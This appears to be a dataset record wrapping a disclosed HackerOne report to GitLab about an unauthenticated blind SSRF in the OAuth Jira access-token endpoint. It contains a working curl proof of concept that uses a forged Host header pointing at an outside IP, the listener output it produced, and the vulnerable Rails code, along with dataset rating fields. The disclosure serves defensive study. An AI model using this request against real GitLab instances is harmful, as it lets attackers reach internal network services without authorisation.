{
  "reported_to": "GitLab",
  "reported_by": "jobert ",
  "title": "Unauthenticated blind SSRF in OAuth Jira authorization controller",
  "content": "\nThe Oauth::Jira::AuthorizationsController#access_token endpoint is vulnerable to a blind SSRF vulnerability. The vulnerability allows an attacker to make arbitrary HTTP/HTTPS requests inside a GitLab instance's network.\nProof of concept\nTo reproduce the vulnerability, follow the steps below.\nspin up a GitLab EE instance with the latest version (11.2.1-ee)\nsend a POST request to the /-/jira/login/oauth/callback endpoint, as shown below. In the request, point the Host header to the hostname / IP address and port number you want to send the request to:\nCode 94 Bytes\n1curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'\nObserve a POST request being sent to 162.243.147.21:81 (in this case HTTPS):\nCode 245 Bytes\n1Listening on [0.0.0.0] (family 0, port 81)\n2Connection from [35.231.137.154] port 81 [tcp/*] accepted (family 2, sport 58558)\n3\ufffd\ufffd\u0612\ufffd\ufffd\ufffd\ufffd\n4\ufffd\ufffd/$\ufffd\ufffd\ufffd\ufffd4\ufffdi\ufffd,\ufffd\u059fJ%>\ufffd+\ufffd/\ufffd,\ufffd0\ufffd\ufffd\ufffd\ufffd\ufffd#\ufffd'\ufffd\t\ufffd\ufffd$\ufffd(\ufffd\n5\ufffdgk39@j28\ufffd\ufffd<=/5\ufffdl162.243.147.21\n6\n7 Connection closed, listening again.\nVulnerable code\nThe following code can be found in the Oauth::Jira::AuthorizationsController#access_token method.\nCode 494 Bytes\n1def access_token\n2  auth_params = params\n3                  .slice(:code, :client_id, :client_secret)\n4                  .merge(grant_type: 'authorization_code', redirect_uri: oauth_jira_callback_url)\n5\n6  auth_response = Gitlab::HTTP.post(oauth_token_url, body: auth_params, allow_local_requests: true)\n7  token_type, scope, token = auth_response['token_type'], auth_response['scope'], auth_response['access_token']\n8\n9  render text: \"access_token=#{token}&scope=#{scope}&token_type=#{token_type}\"\n10end\nThe GItlab::HTTP.post call is using the oauth_token_url directly. This _url Rails routing helper uses the Host header to construct the URL it needs to point to. Because every host is accepted in GitLab, the constructed URL can point to an internal system. This is how it's supposed to work. However, the Host header should be checked before making the post call to avoid an attacker being able to make arbitrary requests.\nImpact\nThe response of the server is actually interpreted, but this is limited to a JSON response that returns an access_token, scope, and token_type. However, this may have additional consequences in case there are unauthenticated endpoints within the instance's network. This isn't very likely, which is why the attack complexity is set to High. It has a minor impact on Availability, because a thread is blocked on the TCP read timeout, which is set to 60 seconds (curl -X POST -H 'Host: 162.243.147.21:81' 0.03s user 0.01s system 0% cpu 1:00.76 total). The integrity impact is currently set at High, but this depends on additional factors, such as what other internal services can be hit. The user does not need to be authenticated to execute the call.\n\n",
  "severity": [
    7.5,
    null
  ],
  "bounty": 4000,
  "weaknesses": [
    "Server-Side Request Forgery (SSRF)"
  ],
  "screenshots": {},
  "disclosed_date": 1552595280,
  "report_url": "https://hackerone.com/reports/398799",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "LOW",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Send a POST request to the '/-/jira/login/oauth/callback' endpoint with a manipulated 'Host' header pointing to the desired internal system."
    ],
    [
      2,
      "Observe the response or the network interaction to confirm the SSRF vulnerability."
    ]
  ],
  "vuln_description": "The OAuth Jira authorization controller in GitLab is vulnerable to a blind SSRF attack, allowing unauthenticated attackers to make arbitrary HTTP/HTTPS requests within the GitLab instance's network by manipulating the 'Host' header in a POST request to the '/-/jira/login/oauth/callback' endpoint.",
  "reason": "The vulnerability involves a straightforward manipulation of the 'Host' header without requiring complex interactions or understanding of multiple components. The attack leverages a common misconfiguration in URL construction that does not validate the 'Host' header before making the request.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}